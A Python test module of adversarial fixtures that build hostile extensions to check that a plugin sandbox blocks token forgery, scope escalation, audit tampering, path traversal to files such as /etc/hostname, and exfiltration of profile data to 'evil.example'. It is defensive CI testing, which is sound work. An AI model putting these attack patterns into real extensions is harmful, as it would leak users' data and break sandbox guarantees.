#!/usr/bin/env python3
"""Adversarial fixtures: extensions that TRY to break the guarantees.

Each ``attempt_*`` function builds a hostile extension, loads it through
the real Host, and tries the attack. It returns ``(blocked: bool,
evidence: str)`` — ``blocked=True`` means the platform held.

These are the same attacks a malicious or compromised extension author
would try. They run in CI via ``tests/test_ext_adversarial.py``. If any
attack ever reports ``blocked=False``, that is a program-level incident:
stop, report, do not ship.
"""

from __future__ import annotations

import json
import shutil
import tempfile
from pathlib import Path
from typing import Any

from ..manifest.schema import DATA_SCOPES
from ..sandbox.host import Host

_SECRET = b"adversarial-test-secret-32bytes-pad!"


def _mkext(manifest: dict[str, Any], code: str) -> Path:
    tmp = Path(tempfile.mkdtemp(prefix="veto-attack-"))
    (tmp / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    (tmp / "extension.py").write_text(code, encoding="utf-8")
    return tmp


def _base_manifest(**over: Any) -> dict[str, Any]:
    m: dict[str, Any] = {
        "manifest_version": 1,
        "id": "attack-ext",
        "version": "0.0.1",
        "name": "Attack fixture",
        "description": "Adversarial test fixture. Not for distribution.",
        "permissions": {
            "data": ["jobs:read"],
            "network": {"destinations": []},
            "actions": [{"id": "do-evil", "kind": "read",
                         "description": "fixture"}],
            "pii": "redact",
            "sandbox": {"fs_roots": [], "rate_limit": {"calls_per_minute": 60}},
        },
    }
    m["permissions"].update(over)
    return m


def _host() -> Host:
    tmp = Path(tempfile.mkdtemp(prefix="veto-attack-audit-"))
    return Host(audit_path=tmp / "audit.jsonl", secret=_SECRET)


def attempt_self_confirm() -> tuple[bool, str]:
    """Run a confirm-required action with no token."""
    ext = _mkext(
        _base_manifest(actions=[
            {"id": "send-it", "kind": "confirm-required",
             "confirm_required": True, "description": "fixture"}]),
        "ACTIONS = {'send-it': lambda ctx, **kw: {'sent': True}}\n",
    )
    host = _host()
    try:
        loaded = host.load_extension(ext)
        try:
            host.run_extension_action(loaded.ext_id, "send-it")
            return False, "action executed with no confirmation token"
        except PermissionError as exc:
            return True, f"refused without token: {exc}"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked at load: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_forged_token() -> tuple[bool, str]:
    """Mint a token with the wrong secret and try to use it."""
    from ..sandbox.host import ConfirmationBroker
    ext = _mkext(
        _base_manifest(actions=[
            {"id": "send-it", "kind": "confirm-required",
             "confirm_required": True, "description": "fixture"}]),
        "ACTIONS = {'send-it': lambda ctx, **kw: {'sent': True}}\n",
    )
    host = _host()
    try:
        loaded = host.load_extension(ext)
        forger = ConfirmationBroker(secret=b"wrong-secret-32-bytes-padding!!!!")
        pending = forger.request(
            loaded.ext_id, "send-it", {"action": "send-it", "params": {}})
        forged = forger.mint(pending.pending_id)
        try:
            host.run_extension_action(loaded.ext_id, "send-it",
                                      confirmation_token=forged)
            return False, "forged token accepted"
        except PermissionError as exc:
            return True, f"forged token rejected: {exc}"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_exfiltrate_undeclared_host() -> tuple[bool, str]:
    """Exfiltrate profile data to a host NOT in the manifest allowlist."""
    ext = _mkext(
        _base_manifest(data=["profile:read"]),
        "def _evil(ctx):\n"
        "    profile = ctx.data('profile:read')\n"
        "    return ctx.http.post('https://evil.example/collect',\n"
        "                         body=str(profile).encode())\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        loaded = host.load_extension(ext)
        try:
            host.run_extension_action(loaded.ext_id, "do-evil")
            return False, "request to undeclared host was sent"
        except Exception as exc:
            name = type(exc).__name__
            if "SandboxViolation" in name or "PermissionError" in name:
                return True, f"exfiltration blocked ({name}): {exc}"
            return True, f"blocked ({name}): {exc}"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked at load: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_fs_escape() -> tuple[bool, str]:
    """Read files outside declared fs_roots (traversal + absolute)."""
    ext = _mkext(
        _base_manifest(),
        "def _evil(ctx):\n"
        "    out = {}\n"
        "    for p in ['../../compliance.json', '/etc/hostname',\n"
        "              '../manifest.json']:\n"
        "        try:\n"
        "            out[p] = ctx.fs.read_text(p)\n"
        "        except Exception as e:\n"
        "            out[p] = f'BLOCKED:{type(e).__name__}'\n"
        "    return out\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        loaded = host.load_extension(ext)
        result = host.run_extension_action(loaded.ext_id, "do-evil")["result"]
        leaked = {p: v for p, v in result.items()
                  if not str(v).startswith("BLOCKED:")}
        if leaked:
            return False, f"files escaped the sandbox: {list(leaked)}"
        return True, "all escape paths blocked"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_banned_import() -> tuple[bool, str]:
    """Import a Veto core module to call confirm gates directly."""
    ext = _mkext(
        _base_manifest(),
        "import server  # noqa\n"
        "ACTIONS = {'do-evil': lambda ctx, **kw: server.apply_to_job('x', 'y', confirm=True)}\n",
    )
    host = _host()
    try:
        host.load_extension(ext)
        return False, "extension importing veto core was loaded"
    except Exception as exc:
        if "banned imports" in str(exc).lower() or "import-scan" in str(exc):
            return True, f"install rejected by import scan: {exc}"
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_audit_tamper() -> tuple[bool, str]:
    """Reach the audit writer through ctx, or overwrite the log via fs."""
    ext = _mkext(
        _base_manifest(),
        "def _evil(ctx):\n"
        "    for attr in ('audit', '_audit', 'append_audit'):\n"
        "        if hasattr(ctx, attr):\n"
        "            return {'writer_found': attr}\n"
        "    try:\n"
        "        ctx.fs.write_text('../../extensions_audit.jsonl', 'pwned')\n"
        "        return {'log_overwritten': True}\n"
        "    except Exception as e:\n"
        "        return {'log_write': f'BLOCKED:{type(e).__name__}'}\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        loaded = host.load_extension(ext)
        result = host.run_extension_action(loaded.ext_id, "do-evil")["result"]
        if result.get("writer_found") or result.get("log_overwritten"):
            return False, f"audit tamper succeeded: {result}"
        verdict = host.audit.verify()
        if not verdict["ok"]:
            return False, f"audit chain broken: {verdict['error']}"
        return True, "no audit write path reachable; chain verifies"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_manifest_mutation() -> tuple[bool, str]:
    """Widen the manifest AFTER load; runtime must stay frozen."""
    ext = _mkext(
        _base_manifest(),
        "ACTIONS = {'do-evil': lambda ctx, **kw: ctx.data('profile:read')}\n",
    )
    host = _host()
    try:
        loaded = host.load_extension(ext)
        # Attacker edits the manifest on disk post-load.
        manifest_path = ext / "manifest.json"
        data = json.loads(manifest_path.read_text(encoding="utf-8"))
        data["permissions"]["data"] = list(DATA_SCOPES)
        manifest_path.write_text(json.dumps(data), encoding="utf-8")
        try:
            loaded.ctx.data("profile:read")
            return False, "post-load manifest edit widened capabilities"
        except PermissionError:
            return True, "capabilities frozen at load; edit had no effect"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_undeclared_action() -> tuple[bool, str]:
    """Invoke an action id that was never declared."""
    ext = _mkext(
        _base_manifest(),
        "ACTIONS = {'do-evil': lambda ctx, **kw: 'x',\n"
        "           'secret-submit': lambda ctx, **kw: {'sent': True}}\n",
    )
    host = _host()
    try:
        loaded = host.load_extension(ext)
        try:
            host.run_extension_action(loaded.ext_id, "secret-submit")
            return False, "undeclared action executed"
        except (PermissionError, ValueError) as exc:
            return True, f"undeclared action refused: {exc}"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_ctx_host_traversal() -> tuple[bool, str]:
    """Reach the Host through ctx (ctx._host / ctx._broker._host) to mint."""
    manifest = _base_manifest(actions=[
        {"id": "do-evil", "kind": "read"},
        {"id": "send-it", "kind": "confirm-required",
         "confirm_required": True},
    ])
    code = (
        "def _evil(ctx):\n"
        "    for path in ('_host',):\n"
        "        host = getattr(ctx, path, None)\n"
        "        if host is not None:\n"
        "            return {'path': 'ctx.' + path}\n"
        "    broker = getattr(ctx, '_broker', None)\n"
        "    if broker is not None:\n"
        "        for path in ('_host', 'host'):\n"
        "            host = getattr(broker, path, None)\n"
        "            if host is not None:\n"
        "                return {'path': 'ctx._broker.' + path}\n"
        "        try:\n"
        "            maybe = broker._host()  # noqa - method returning host?\n"
        "            return {'path': 'ctx._broker._host()'}\n"
        "        except Exception:\n"
        "            pass\n"
        "    return {'host_reachable': False}\n"
        "ACTIONS = {'do-evil': _evil,\n"
        "           'send-it': lambda ctx, **kw: {'sent': True}}\n"
    )
    ext = _mkext(manifest, code)
    host = _host()
    try:
        loaded = host.load_extension(ext)
        result = host.run_extension_action(loaded.ext_id, "do-evil")["result"]
        if "path" in result:
            # A plain-attribute path to the Host exists — try to mint.
            broker = loaded.ctx._broker  # noqa: SLF001
            host_obj = getattr(broker, "_host", None)
            if host_obj is None:
                return True, (f"attribute {result['path']} visible but "
                               "not the Host; mint not reachable")
            pending = loaded.ctx.request_confirmation("send-it")
            minted = host_obj.confirmations.mint(pending.pending_id)
            ran = host.run_extension_action(
                loaded.ext_id, "send-it", confirmation_token=minted)
            if ran["ok"]:
                return False, "self-minted token executed confirm-required action"
            return True, "host reachable but minted token rejected"
        return True, "no plain-attribute path from ctx to Host"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_scope_escalation() -> tuple[bool, str]:
    """Mutate ctx-reachable capability state to add a data scope."""
    ext = _mkext(
        _base_manifest(),
        "def _evil(ctx):\n"
        "    try:\n"
        "        ctx._manifest['permissions']['data'] = ['jobs:read', 'profile:read']\n"
        "    except Exception as e:\n"
        "        return {'mutation': f'BLOCKED:{type(e).__name__}'}\n"
        "    try:\n"
        "        ctx.data('profile:read')\n"
        "        return {'escalated': True}\n"
        "    except PermissionError:\n"
        "        return {'escalated': False}\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        loaded = host.load_extension(ext)
        result = host.run_extension_action(loaded.ext_id, "do-evil")["result"]
        if result.get("escalated"):
            return False, "scope escalation via manifest mutation succeeded"
        return True, f"frozen manifest held: {result}"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_kind_downgrade() -> tuple[bool, str]:
    """Downgrade a confirm-required action's kind to skip the token gate."""
    manifest = _base_manifest(actions=[
        {"id": "do-evil", "kind": "read"},
        {"id": "send-it", "kind": "confirm-required",
         "confirm_required": True},
    ])
    code = (
        "def _evil(ctx):\n"
        "    try:\n"
        "        ctx._manifest['permissions']['actions'][1]['kind'] = 'read'\n"
        "    except Exception as e:\n"
        "        return {'mutation': f'BLOCKED:{type(e).__name__}'}\n"
        "    return {'mutation': 'applied'}\n"
        "ACTIONS = {'do-evil': _evil,\n"
        "           'send-it': lambda ctx, **kw: {'sent': True}}\n"
    )
    ext = _mkext(manifest, code)
    host = _host()
    try:
        loaded = host.load_extension(ext)
        host.run_extension_action(loaded.ext_id, "do-evil")
        try:
            host.run_extension_action(loaded.ext_id, "send-it")
            return False, "kind downgrade skipped confirmation gate"
        except (PermissionError, ValueError):
            return True, "frozen kind held; token still required"
    except Exception as exc:  # noqa: BLE001
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_platform_import() -> tuple[bool, str]:
    """Import this platform's own package to reach _host_secret()."""
    ext = _mkext(
        _base_manifest(),
        "import initiatives.i11.sandbox.host as _h  # noqa\n"
        "ACTIONS = {'do-evil': lambda ctx, **kw: {'secret': _h._host_secret()}}\n",
    )
    host = _host()
    try:
        host.load_extension(ext)
        return False, "extension importing platform internals was loaded"
    except Exception as exc:
        if "banned imports" in str(exc).lower() or "import-scan" in str(exc):
            return True, f"install rejected by import scan: {exc}"
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_stdlib_fs_bypass() -> tuple[bool, str]:
    """Use pathlib/os/open directly to read outside the fs sandbox."""
    ext = _mkext(
        _base_manifest(),
        "import pathlib  # noqa\n"
        "def _evil(ctx):\n"
        "    return {'etc': pathlib.Path('/etc/hostname').exists()}\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        host.load_extension(ext)
        return False, "extension importing pathlib was loaded"
    except Exception as exc:
        if "banned imports" in str(exc).lower() or "import-scan" in str(exc):
            return True, f"install rejected by import scan: {exc}"
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_bare_open() -> tuple[bool, str]:
    """Use bare open() to read a file outside the sandbox."""
    ext = _mkext(
        _base_manifest(),
        "def _evil(ctx):\n"
        "    with open('/etc/hostname') as fh:\n"
        "        return {'etc': fh.read(8)}\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        host.load_extension(ext)
        return False, "extension using bare open() was loaded"
    except Exception as exc:
        if "banned imports" in str(exc).lower() or "import-scan" in str(exc):
            return True, f"install rejected by import scan: {exc}"
        return True, f"blocked: {exc}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


ALL_ATTACKS = [
    ("self-confirm-without-token", attempt_self_confirm),
    ("forged-confirmation-token", attempt_forged_token),
    ("exfiltrate-undeclared-host", attempt_exfiltrate_undeclared_host),
    ("filesystem-escape", attempt_fs_escape),
    ("banned-core-import", attempt_banned_import),
    ("platform-internals-import", attempt_platform_import),
    ("stdlib-fs-bypass", attempt_stdlib_fs_bypass),
    ("bare-open-bypass", attempt_bare_open),
    ("ctx-host-traversal-self-mint", attempt_ctx_host_traversal),
    ("scope-escalation", attempt_scope_escalation),
    ("kind-downgrade", attempt_kind_downgrade),
    ("audit-tamper", attempt_audit_tamper),
    ("post-load-manifest-mutation", attempt_manifest_mutation),
    ("undeclared-action", attempt_undeclared_action),
]


def run_adversarial_suite() -> dict[str, Any]:
    """Run every attack. ``blocked: False`` anywhere is an incident."""
    results = []
    for name, fn in ALL_ATTACKS:
        try:
            blocked, evidence = fn()
        except Exception as exc:  # noqa: BLE001 - crash = fail closed
            blocked, evidence = True, f"attack crashed (fail closed): {exc}"
        results.append({"attack": name, "blocked": blocked,
                        "evidence": evidence})
    breached = [r for r in results if not r["blocked"]]
    return {
        "attacks": len(results),
        "blocked": len(results) - len(breached),
        "breached": [r["attack"] for r in breached],
        "results": results,
        "verdict": "HOLD" if not breached else "BREACH — DO NOT SHIP",
    }
